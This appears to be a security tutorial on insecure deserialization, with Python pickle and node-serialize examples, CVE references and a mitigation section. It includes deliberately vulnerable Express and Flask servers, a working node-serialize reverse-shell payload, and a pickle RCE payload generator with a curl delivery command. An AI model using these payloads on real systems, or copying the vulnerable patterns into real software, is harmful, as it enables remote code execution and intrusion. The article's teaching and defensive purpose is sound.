# Insecure Deserialization

## Introduction to Insecure Deserialization

Insecure Deserialization is one of the OWASP Top 10 web vulnerabilities for 2017. OWASP has included this issue in the [OWASP Top 10:2021](https://owasp.org/Top10/) vulnerabilities as [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/).

---

Deserialization is one of several [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/). It can potentially expose your data into _"a structure that an attacker can see and modify"_. Before we can describe security issues in this article, we need to define serialization and deserialization.

### What is Serialization?

Serialization is the process of converting an object to a byte stream, which can then be sent over a network or saved on a disk. This practise is especially common when data related to Machine Learning is passed over the network as pre-trained Models can be transmitted to other systems or loaded from disc instead of computing them from scratch. The most common example would be the `pickle.dumps()` function in Python3 which serializes any input data. 

Sample code:
```python
import pickle
my_dict = {"Name": "John Doe", "Age": 25, "Score": 80.3}
serialized_data = pickle.dumps(my_dict)
print(serialized_data)
```

Output:

```
b'\x80\x04\x950\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04Name\x94\x8c\x08John Doe\x94\x8c\x03Age\x94K\x19\x8c\x05Score\x94G@T\x1333333u.'
```

### What is Deserialization?

Deserialization is the opposite of Serialization. It is the process of converting a byte stream into a program object. The most common example would be the `pickle.loads()` function in Python3 which deserializes any input data.

Sample Code: 
```python
import pickle

serialized_data = b'\x80\x04\x950\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04Name\x94\x8c\x08John Doe\x94\x8c\x03Age\x94K\x19\x8c\x05Score\x94G@T\x1333333u.'
my_dict = pickle.loads(serialized_data)
print(my_dict)
```

Output:
```
{'Name': 'John Doe', 'Age': 25, 'Score': 80.3}
```

  
  
![Deserialization diagram from portswigger.net](https://portswigger.net/web-security/images/deserialization-diagram.jpg)
![](https://portswigger.net/web-security/images/deserialization-diagram.jpg)

## How  can Deserialization be Insecure?

- Insecure deserialization occurs when attacker-controlled data flows into the deserialization function. This can lead to `"Object Injection"` attacks.
- Most deserialization attacks are executed even before the Deserialization process itself is complete.
- Native deserialization is extremely insecure, hence it is advised to make use of language-agnostic methods for deserialization such as JSON, XML, or YAML.
- Be aware, even these libraries can be susceptible to vulnerabilities. For more information, see:

	- [CVE-2020-1747](https://nvd.nist.gov/vuln/detail/cve-2020-1747) - `PyYAML` library in versions before `5.3.1` is susceptible to arbitrary code execution when it processes untrusted YAML files through the `full_load` method or with the `FullLoader` loader. 
	- [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941) -  `node-serialize` package `0.0.4` is vulnerable to insecure deserialization attacks as untrusted data passed into the `unserialize()` function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an `Immediately Invoked Function Expression (IIFE)`.
	
## Impact of Insecure Deserialization

Insecure deserialization can lead to:
- Object Injection
- Denial of Service
- Tampering of Application Logic by Changing Control Flow
- Remote Code Execution

## Cause of Insecure Deserialization
- Insecure Deserialization occurs when external or user-controlled data flows into deserialization functions.
- Putting checks for user-input data is seldom useful as it is extremely hard to come up with checks for all possible cases.
- In the case of using language-agnostic methods for deserialization, in most cases, the libraries used themselves have underlying vulnerabilities and incomplete bug fixes. 
- Ideally, no user-controlled data should be deserialized.

# Some interesting attack scenarios

The most common use of deserialization is in Machine Learning. Some examples of related vulnerabilities are:
- [Arbitrary code execution via Insecure YAML deserialization in Nvidia runx](https://huntr.dev/bounties/1-pypi-runx/)
- [Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)](https://hackerone.com/reports/1174185)

For web applications, some interesting vulnerabilities are:
- [Bitbucket Data Center - Java Deserialization Vulnerability In Hazelcast - CVE-2022-26133](https://jira.atlassian.com/browse/BSERV-13173)
- [Confluence Data Center - Java Deserialization Vulnerability In Hazelcast - CVE-2016-10750](https://jira.atlassian.com/browse/BSERV-13173)

A non-exhaustive list of attack scenarios and vulnerabilities that can arise out of insecure deserialization, especially concerning web applications, are as follows:

- Direct deserialization of user-controlled data. Example: CVE-2019-10068
- Native vulnerabilities in libraries. Example: CVE-2020-1747 
- Improper deserialization of language agnostic methods like XML and JSON data. Example: CVE-2017-9805

In some cases, serialized data is also used to implement authorization and authentication. Consider the following snippet taken from [MITRE](https://cwe.mitre.org/data/definitions/502.html):

```python
class ExampleProtocol(protocol.Protocol):  
	def dataReceived(self, data):    
		# Code that would be here would parse the incoming data  
		# After receiving headers, call confirmAuth() to authenticate  

	def confirmAuth(self, headers):  
		try:  
			token = cPickle.loads(base64.b64decode(headers['AuthToken']))  
			if not check_hmac(token['signature'], token['data'], getSecretKey()):  
				raise AuthFail  
			self.secure_data = token['data']  
		except:  
			raise AuthFail

```

Under the given scenario, serialized data is used to authorize a user. Any errors or discrepancies raise an `AuthFail` exception. However, n attacker can use a Base64 encoded deserialization payload that would be triggered whenever the `AuthToken` token header is parsed.

# Vulnerable Code Snippets
## NodeJS
One of the most well-known deserialization vulnerabilities to be found in a NodeJS application was [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941). The vulnerability exists in the `node-serialize@0.0.4` library and allows the exploitation of the `unserialize()` function to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).

Consider the following example code:
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();

app.use(cookieParser())
app.get('/', function(req, res) {
   if (req.cookies.profile) {
      var str = new Buffer(req.cookies.profile, 'base64').toString();
      var obj = serialize.unserialize(str);

      if (obj.username) {
         res.send( "Hello " + escape(obj.username));
      }
   } else {
      res.cookie('profile', "eyJ1c2VybmFtZSI6ImFkbWluIiwiY29tcGFueSI6ImtvbmR1a3RvIiwibG9jYXRpb24iOiJjbG91ZGJhbmsifQ==" , {
         maxAge: 900000,
         httpOnly: true
      });
      res.send("Hello stranger");
   }
});

app.listen(3000);

```

The above program creates a server that listens on port 3000. However, the following lines are very crucial:

```js
var str = new Buffer(req.cookies.profile, 'base64').toString();
var obj = serialize.unserialize(str);
```

Essentially, the server decodes the base64 encoded cookie and then proceeds to deserialize it with the `serialize.unserialize()` function without any checks. This leads to the server code being vulnerable and allows and attacker the capability to execute code eremotely. For example, to spawn a reverse shell, an attacker can use the following payload:

```
{"rce":"_$$ND_FUNC$$_function() { var net = require('net'); var spawn =
require('child_process').spawn; HOST = \"127.0.0.1\"; PORT = \"1337\";
TIMEOUT = \"5000\"; if (typeof String.prototype.contains === 'undefined') { 
String.prototype.contains = function(it) { return this.indexOf(it) != -1;
}; } function c(HOST, PORT) { var client = new net.Socket();
client.connect(PORT, HOST, function() { var sh = spawn(\"sh\", []);
client.write(\"Connected!\"); client.pipe(sh.stdin);
sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',
function(code, signal) { client.end(\"Disconnected!\"); }); });
client.on('error', function(e) { setTimeout(c(HOST, PORT), TIMEOUT); }); }
c(HOST, PORT);}( )"}
```

Base64 encoding the above payload and putting it as the cookie value of the request will create a reverse shell to `127.0.0.1` on port `1337`.

## Python3
The most common use of deserialization in python is via the `pickle.loads()` function. Consider the following server code:
```python
import pickle
import binascii
from base64 import urlsafe_b64decode
from flask import Flask
from flask import request, jsonify

app = Flask(__name__)


@app.route('/', methods = ['GET', 'POST'])
def user():
    if request.method == 'GET':
        return jsonify({"message":"Hello World!"})

        
    if request.method == 'POST':
        try:
            data = request.form 
            decoded = urlsafe_b64decode(data['payload'])
            username = pickle.loads(decoded) #vulnerable deserialization
            return jsonify({'Hi':username})

        except Exception as e:
            return jsonify({'Hi': 'Stranger'})

if __name__ == '__main__':
    app.run()

```

The server behaves similarly to the NodeJS example. It listens on port 5000 and when a POST request is made to the endpoint, it tries to decode and deserialize the data in order to extract a username from it. In case of any errors, it responds back with a generic message otherwise replies with the name of the user. 

Again, the serialized data is read directly from the request body without any checks. Therefore, it can be exploited easily to gain Remote code execution by generating payloads with the following script:

```python
import pickle
import base64
import os

RCE_CMD = 'touch /tmp/PoC'

class RCE:
    def __reduce__(self):
        cmd = (RCE_CMD)
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

The resulting output would be a payload, which when sent in the POST body would execute the respective command on the system. For example, the following payload executes the command `touch /tmp/PoC` on the server:

```bash
$ curl -X POST http://127.0.0.1:5000/ -d "{'payload': 'gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA50b3VjaCAvdG1wL1BvQ5SFlFKULg=='}"
```

# Mitigation

- Never directly deserialize any user-controlled or untrusted data. For example, take the original code snippet:  

```python
class ExampleProtocol(protocol.Protocol):  
	def dataReceived(self, data):    
		# Code that would be here would parse the incoming data  
		# After receiving headers, call confirmAuth() to authenticate  

	def confirmAuth(self, headers):  
		try:  
			token = cPickle.loads(base64.b64decode(headers['AuthToken']))  # User control data flows into insecure cPickle.loads() function
			if not check_hmac(token['signature'], token['data'], getSecretKey()):  
				raise AuthFail  
			self.secure_data = token['data']  
		except:  
			raise AuthFail
```

 In the above example, data from request headers flow directly into the deserialization function, making it vulnerable. 

-  Run untrusted deserialization function inside a sandbox. One such sandbox that developers can use is [nsjail](https://github.com/google/nsjail).
-  Use deserialization methods like JSON, XML, and YAML that are language-agnostic.
-  Use only updated libraries to ensure that any known security bugs are patched. For example, PyYaml version 5.4 is known to be vulnerable to CVE-2020-14343 but was fixed in subsequent versions.
-  Limit and check all incoming and outgoing network activity from deserialization containers and servers. This can be achieved by monitoring incoming stream for knows signatures as most deserialization attacks have very common structures. 
-  If you're a Java developer, you may need to implement the `serializable` interface due to inheritance. You can override the `readObject()` to prevent actual deserialization. Take the following example from [Snyk](https://snyk.io/):

```java
private final void readObject(ObjectInputStream in) throws java.io.IOException { 
	throw new java.io.IOException("Deserialized not allowed"); 
}
```
- If you're using PHP, you may need to pass serialized data to the user. In that case, don't use the `unserialize()` function. Use a safe standard data interchange format such as `JSON` (via `json_decode()` and `json_encode()`).
